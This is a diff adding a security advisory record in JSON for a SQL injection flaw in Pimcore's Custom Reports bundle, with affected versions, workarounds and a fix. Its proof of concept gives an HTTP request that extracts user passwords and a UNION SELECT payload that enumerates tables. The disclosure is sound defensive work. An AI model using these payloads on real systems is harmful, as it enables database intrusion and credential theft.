@@ -1,0 +1,116 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-23rh-xw42-fq82",
+  "modified": "2026-09-10T19:25:05Z",
+  "published": "2026-09-10T19:25:05Z",
+  "aliases": [
+    "CVE-2026-55416"
+  ],
+  "summary": "Pimcore: SQL Injection in Custom Reports via Malicious Report Configuration",
+  "details": "# Security Advisory: SQL Injection in Custom Reports via Malicious Report Configuration\n\n## Summary\n\n### Impact\n\nA SQL injection vulnerability exists in the Custom Reports bundle (`bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php:84-135`). An authenticated attacker with `reports_config` permission can inject arbitrary SQL via the report configuration fields (`sql`, `from`, `where`, `groupby`), which are directly concatenated into SQL queries without parameterization. The only protection is a regex blacklist that checks for `ALTER|CREATE|DROP|RENAME|TRUNCATE|UPDATE|DELETE` keywords, which is trivially bypassable — it does not block `INSERT`, `UNION SELECT`, `LOAD_FILE()`, `INTO OUTFILE`, stacked queries, subqueries, or MySQL comment injection (`/*!*/`). Exploitation allows reading, modifying, or deleting all data in the database, leading to complete data compromise.\n\nAdditionally, the LIMIT clause at line 51 directly interpolates `$offset` and `$limit` without integer casting, creating a secondary injection point.\n\n### Patches\n\nVersions 2026.1.6, 12.3.10, 11.5.19.\n\n### Workarounds\n\n1. Restrict `reports_config` permission to only highly trusted administrators\n2. Deploy a WAF rule to block requests to `/admin/bundle/customreports/custom-report/update` containing SQL keywords in the `configuration` parameter\n3. Replace the custom SQL adapter with a parameterized query builder approach\n\n## Attack Path (Validation Evidence)\n\n```\n[Entry Point] POST /admin/bundle/customreports/custom-report/update HTTP/1.1\n    ↓ (requires reports_config permission + valid admin session)\n[Controller] CustomReportController::updateAction()\n    ↓  $configuration = decodeJson($request->request->getString('configuration'))\n[Config Store] Configuration saved to custom_reports database table\n[Config Load] Tool\\Config::getByName() loads stdClass $config from DB\n    ↓\n[Adapter] Sql::getBaseQuery() → Sql::buildQueryString($config)\n    ↓  Directly concatenates config fields:\n[Vulnerable] $sql .= \"\\n\" . $config['sql'];        // Line 92\n            $sql .= \"\\n\" . $config['from'];        // Line 103\n            $sql .= \"\\n\" . 'WHERE (' . $config['where'] . ')'; // Line 110\n            $sql .= \"\\n\" . $config['groupby'];     // Line 117\n[Weak Guard] preg_match('/(ALTER|CREATE|DROP|RENAME|TRUNCATE|UPDATE|DELETE)\\s/i', ...)\n    ↓  ✗ Bypassable — missing INSERT, UNION, SELECT, subqueries, comments\n[Execution] $db->fetchAllAssociative($sql);        // Line 54\n    ↓\n[Impact] Arbitrary SQL execution — full database compromise\n```\n\n## Taint Flow (Validation Evidence)\n\n```\nSource: $request->request->getString('configuration')  (HTTP POST body, user-controlled)\n    ↓  json_decode() → stdClass\n[Store]  Persistent in database (custom_reports table)\n[Load]   Config::getByName() → stdClass $config\n    ↓  ✗ No sanitization (only bypassable regex blacklist)\n[Sink]   $db->fetchAllAssociative($concatenatedSql)\n    ↓\nImpact: Attacker-controlled SQL executed against the database\n```\n\n## Proof of Concept\n\n### Steps\n\n1. Authenticate as an admin user with `reports_config` permission\n2. Send a report update request with malicious SQL in the configuration:\n\n### Request\n\n```http\nPOST /admin/bundle/customreports/custom-report/update HTTP/1.1\nHost: <target-host>\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=<valid_admin_session>\n\nname=malicious_report&configuration=%7B%22sql%22%3A%22SELECT%20id%2C%20username%2C%20password%20FROM%20users%22%2C%22from%22%3A%22users%22%2C%22where%22%3A%221%3D1%22%2C%22groupby%22%3A%22%22%2C%22dataSourceConfig%22%3A%7B%7D%7D\n```\n\n3. Access the report data endpoint to retrieve extracted user credentials\n4. Alternatively, the `where` field can be set to:\n   ```\n   1=1 UNION SELECT TABLE_NAME, TABLE_SCHEMA, 1 FROM INFORMATION_SCHEMA.TABLES\n   ```\n   to enumerate all database tables\n\n### Expected Result\n\nThe custom report returns rows from arbitrary tables beyond what was intended, proving successful SQL injection.\n\n## Affected Component\n\n- **File:** `bundles/CustomReportsBundle/src/Tool/Adapter/Sql.php`\n- **Method:** `buildQueryString()` (lines 84-135), `getBaseQuery()` (lines 137-216), `getData()` (lines 25-58)\n- **Class:** `Pimcore\\Bundle\\CustomReportsBundle\\Tool\\Adapter\\Sql`\n\n## Fix Recommendation\n\nReplace the custom SQL concatenation approach with a parameterized query builder:\n\n```php\n// Instead of:\n$sql .= \"\\n\" . $config['sql'];\n$sql .= \"\\n\" . $config['from'];\n$sql .= \"\\n\" . 'WHERE (' . $config['where'] . ')';\n\n// Use a whitelist-based approach:\n// 1. Only allow predefined table names from a whitelist\n// 2. Use Doctrine QueryBuilder for WHERE conditions\n// 3. Use parameterized queries for all user-supplied values\n// 4. Cast LIMIT/OFFSET to integers\n\n$sql .= ' LIMIT ' . (int)$offset . ',' . (int)$limit;\n```\n\n## Resources\n\n- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "pimcore/pimcore"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2026.1.0"
+            },
+            {
+              "fixed": "2026.1.6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2026.1.5"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "pimcore/pimcore"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "12.0.0-RC1"
+            },
+            {
+              "fixed": "12.3.10"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 12.3.9"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "pimcore/pimcore"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "11.5.19"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "< 11.5.18"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pimcore/pimcore/security/advisories/GHSA-23rh-xw42-fq82"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pimcore/pimcore"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pimcore/pimcore/releases/tag/v11.5.19"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pimcore/pimcore/releases/tag/v12.3.10"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pimcore/pimcore/releases/tag/v2026.1.6"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-09-10T19:25:05Z",
+    "nvd_published_at": null
+  }
+}
